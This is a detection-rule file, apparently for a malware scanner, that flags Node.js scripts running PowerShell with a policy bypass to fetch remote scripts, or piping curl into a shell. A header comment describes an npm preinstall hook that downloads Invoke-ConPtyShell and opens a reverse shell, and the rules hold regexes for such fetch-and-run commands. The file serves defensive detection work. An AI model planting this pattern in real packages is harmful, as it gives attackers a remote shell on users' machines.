# A Node script that hands the actual work to PowerShell.
#
# The PowerShell download-execute rules in this directory are `for:
# [powershell]`, so they read a `.ps1`. Here the one-liner is a string inside a
# `.js` file handed to `child_process.exec` or `spawn`, and nothing PowerShell-typed is
# ever analysed -- the carrier is JavaScript even though the payload is not.
#
# `-ExecutionPolicy Bypass` is the tell. It exists to defeat the machine's own
# script policy, and a published Node package has no business turning that off
# on the machine installing it. Paired with a remote script URL and a shell
# call, the sequence is fetch-and-run against a control the operator does not
# own.
#
# Worked example: an npm `preinstall` that execs `powershell -NoProfile
# -ExecutionPolicy Bypass -Command "IEX(IWR <raw.githubusercontent.com path to
# Invoke-ConPtyShell.ps1>); Invoke-ConPtyShell <ip> <port>"`.
defaults:
  platforms: [windows, linux]
  for: [javascript, typescript]
  attack: T1059.001,T1105
  mbc: E1105

traits:
  - id: js-exec-curl-pipe-shell-literal
    desc: child_process exec string pipes curl to shell
    crit: notable
    conf: 0.95
    attack: T1059.004,T1105
    if:
      type: text
      regex: '\bexec\s*\(\s*["''][^"'']{0,12}curl\s+[^"'']{0,240}\|\s*(bash|sh)\b'

composite_rules:
  - id: node-exec-powershell-remote-script
    desc: Node exec runs PowerShell fetching remote script
    crit: hostile
    conf: 0.97
    # The exec, the policy bypass, and the fetched script are one call.
    # An earlier or later exec checking versions or running unrelated commands
    # must not join an installer command string elsewhere in the same file.
    near_bytes: 1024
    all:
      - id: micro-behaviors/process/create/shell/bridge::js-exec
      - id: micro-behaviors/process/create/flags::powershell-policy-bypass-argument
    any:
      - id: micro-behaviors/communications/http/url/github::raw-githubusercontent-script-file
      - id: micro-behaviors/communications/http/download/url::executable-url-reference
      - id: micro-behaviors/communications/http/lib/invoke-webrequest::embedded-irm-iex-pipeline
      - id: micro-behaviors/communications/http/download/cli::embedded-powershell-irm-iex-command
      - id: micro-behaviors/communications/http/download/cli::embedded-iwr-pipe-iex
      - id: micro-behaviors/communications/http/download/cli::embedded-iwr-outfile-download
    # Anthropic's own Claude Code bootstrap (`irm https://claude.ai/install.ps1
    # | iex`), run by setup wizards on the user's behalf, is the vendor
    # installer rather than a payload fetched from an attacker host. Astral's
    # uv bootstrap (`irm https://astral.sh/uv/install.ps1 | iex`) is the same
    # shape: the documented Windows install command that agent and Python
    # toolchain launchers run when the user asks for uv.
    unless:
      - id: well-known/app/ai/coding-agent/anthropic-claude-code::official-installer-url
      - id: well-known/tool/packaging/uv::uv-install-sh-bootstrap-url
      # Install commands handed to a shown VS Code terminal run where the
      # user watches: transparent dependency setup, not a silent fetch.
      - id: micro-behaviors/process/create/shell/terminal::terminal-shown-text-submit

  - id: node-exec-curl-pipe-remote-shell
    desc: Node exec pipes remote curl into POSIX shell
    crit: hostile
    conf: 0.97
    near_bytes: 512
    all:
      - id: micro-behaviors/process/create/shell/bridge::js-exec
      - id: js-exec-curl-pipe-shell-literal

  - id: node-spawn-powershell-remote-script
    desc: Node spawn runs PowerShell fetching remote script
    crit: hostile
    conf: 0.97
    # The spawn, the policy bypass, and the fetched script are one call.
    # A later spawn that only assigns environment variables must not join
    # an installer command elsewhere in the same file.
    near_bytes: 1024
    all:
      - id: micro-behaviors/process/create/shell/script-host::powershell-exe-spawn
      - id: micro-behaviors/process/create/flags::powershell-policy-bypass-argument
    any:
      - id: micro-behaviors/communications/http/url/github::raw-githubusercontent-script-file
      - id: micro-behaviors/communications/http/download/url::executable-url-reference
      - id: micro-behaviors/communications/http/lib/invoke-webrequest::embedded-irm-iex-pipeline
      - id: micro-behaviors/communications/http/download/cli::embedded-powershell-irm-iex-command
      - id: micro-behaviors/communications/http/download/cli::embedded-iwr-pipe-iex
      - id: micro-behaviors/communications/http/download/cli::embedded-iwr-outfile-download
    # Anthropic's own Claude Code bootstrap (`irm https://claude.ai/install.ps1
    # | iex`), run by setup wizards on the user's behalf, is the vendor
    # installer rather than a payload fetched from an attacker host. Astral's
    # uv bootstrap (`irm https://astral.sh/uv/install.ps1 | iex`) is the same
    # shape: the documented Windows install command that agent and Python
    # toolchain launchers run when the user asks for uv.
    unless:
      - id: well-known/app/ai/coding-agent/anthropic-claude-code::official-installer-url
      - id: well-known/tool/packaging/uv::uv-install-sh-bootstrap-url
      # Install commands handed to a shown VS Code terminal run where the
      # user watches: transparent dependency setup, not a silent fetch.
      - id: micro-behaviors/process/create/shell/terminal::terminal-shown-text-submit
